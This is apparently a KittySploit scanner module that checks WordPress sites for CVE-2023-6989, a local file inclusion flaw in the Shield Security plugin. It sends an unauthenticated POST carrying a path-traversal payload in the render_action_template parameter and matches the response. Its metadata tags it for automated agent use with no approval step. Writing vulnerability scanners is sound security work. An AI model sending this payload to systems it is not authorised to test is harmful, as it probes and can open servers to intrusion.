#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Shield Security Smart Bot Blocking & Intrusion Prevention Security plugin for WordPress is vulnerable to L."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Shield Security WP Plugin <= 18.5.9 - Local File Inclusion Detection',
        'description': 'The Shield Security Smart Bot Blocking & Intrusion Prevention Security plugin for WordPress is vulnerable to Local File Inclusion in all versions up to, and including, 18.5.9 via the render_action_template parameter. This makes it possible for unauthenticated attacker to include and execute PHP files on the server, allowing the execution of any PHP code in those files.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'wpscan', 'cve', 'cve2023', 'wp', 'wordpress', 'wp-plugin', 'lfi', 'shield-security', 'getshieldsecurity', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/a485aee7-39a0-418c-9699-9afc53e28f55/',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-6989',
            'https://github.com/fkie-cad/nvd-json-data-feeds',
        ],
        'cve': 'CVE-2023-6989',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}, data='action=shield_action&ex=generic_render&exnonce=5a988a925a&render_action_template=../../icwp-wpsf.php\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"dashboard_shield"', '"shield_action"', '"search_shield"',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='Shield Security WP Plugin <= 18.5.9 - Local File Inclusion detected', path=path)
            return True
        return False

